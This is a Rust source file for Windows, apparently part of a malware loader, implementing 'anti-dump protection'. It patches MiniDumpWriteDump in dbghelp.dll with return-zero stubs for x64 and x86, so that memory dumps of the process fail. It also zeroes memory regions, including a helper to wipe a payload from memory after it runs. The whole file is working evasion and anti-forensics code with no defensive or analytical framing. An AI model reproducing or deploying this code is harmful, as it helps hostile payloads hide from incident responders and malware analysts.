// Anti-Dump Protection
// Prevents memory dumps and clears sensitive data

use winapi::um::winnt::*;
use winapi::um::memoryapi::*;
use winapi::um::dbghelp::*;
use winapi::um::libloaderapi::*;
use winapi::um::errhandlingapi::*;
use winapi::shared::minwindef::*;
use std::ptr;
use std::ffi::CString;
use crate::api_resolver::resolve_api;

/// Clear sensitive memory region
pub unsafe fn clear_memory(
    address: *mut u8,
    size: usize,
) -> Result<(), String> {
    if address.is_null() || size == 0 {
        return Err("Invalid parameters".to_string());
    }
    
    // Change memory protection to read-write
    let mut old_protect = 0u32;
    if VirtualProtect(
        address as *mut _,
        size,
        PAGE_READWRITE,
        &mut old_protect,
    ) == 0 {
        return Err(format!("Failed to change memory protection: {}", GetLastError()));
    }
    
    // Overwrite with zeros
    ptr::write_bytes(address, 0, size);
    
    // Restore protection
    let mut _dummy = 0u32;
    VirtualProtect(
        address as *mut _,
        size,
        old_protect,
        &mut _dummy,
    );
    
    Ok(())
}

/// Patch MiniDumpWriteDump to prevent memory dumps
pub unsafe fn patch_minidump_write_dump() -> Result<(), String> {
    // Resolve MiniDumpWriteDump from dbghelp.dll
    let dbghelp_dll = CString::new("dbghelp.dll").unwrap();
    let mut dbghelp_module = GetModuleHandleA(dbghelp_dll.as_ptr() as *const i8);
    
    if dbghelp_module.is_null() {
        // dbghelp.dll might not be loaded, try loading it
        dbghelp_module = LoadLibraryA(dbghelp_dll.as_ptr() as *const i8);
        if dbghelp_module.is_null() {
            return Err("Failed to load dbghelp.dll".to_string());
        }
    }
    
    let minidump_name = CString::new("MiniDumpWriteDump").unwrap();
    let minidump_func = GetProcAddress(
        dbghelp_module,
        minidump_name.as_ptr() as *const i8,
    );
    
    if minidump_func.is_null() {
        return Err("Failed to resolve MiniDumpWriteDump".to_string());
    }
    
    // Patch: mov rax, 0; ret (x64) or mov eax, 0; ret (x86)
    #[cfg(target_arch = "x86_64")]
    {
        let patch: [u8; 8] = [0x48, 0xC7, 0xC0, 0x00, 0x00, 0x00, 0x00, 0xC3];
        let patch_size = patch.len();
        
        // Change memory protection
        let mut old_protect = 0u32;
        if VirtualProtect(
            minidump_func,
            patch_size,
            PAGE_EXECUTE_READWRITE,
            &mut old_protect,
        ) == 0 {
            return Err(format!("Failed to change memory protection: {}", GetLastError()));
        }
        
        ptr::copy_nonoverlapping(
            patch.as_ptr(),
            minidump_func as *mut u8,
            patch_size,
        );
        
        // Restore protection
        let mut _dummy = 0u32;
        VirtualProtect(
            minidump_func,
            patch_size,
            old_protect,
            &mut _dummy,
        );
    }
    
    #[cfg(target_arch = "x86")]
    {
        let patch: [u8; 6] = [0xB8, 0x00, 0x00, 0x00, 0x00, 0xC3];
        let patch_size = patch.len();
        
        // Change memory protection
        let mut old_protect = 0u32;
        if VirtualProtect(
            minidump_func,
            patch_size,
            PAGE_EXECUTE_READWRITE,
            &mut old_protect,
        ) == 0 {
            return Err(format!("Failed to change memory protection: {}", GetLastError()));
        }
        
        ptr::copy_nonoverlapping(
            patch.as_ptr(),
            minidump_func as *mut u8,
            patch_size,
        );
        
        // Restore protection
        let mut _dummy = 0u32;
        VirtualProtect(
            minidump_func,
            patch_size,
            old_protect,
            &mut _dummy,
        );
    }
    
    Ok(())
}

/// Enable anti-dump protection
pub unsafe fn enable_anti_dump() -> Result<(), String> {
    // Patch MiniDumpWriteDump
    let _ = patch_minidump_write_dump();
    
    Ok(())
}

/// Clear payload from memory after execution
pub unsafe fn clear_payload_memory(
    payload_address: *mut u8,
    payload_size: usize,
) -> Result<(), String> {
    clear_memory(payload_address, payload_size)
}
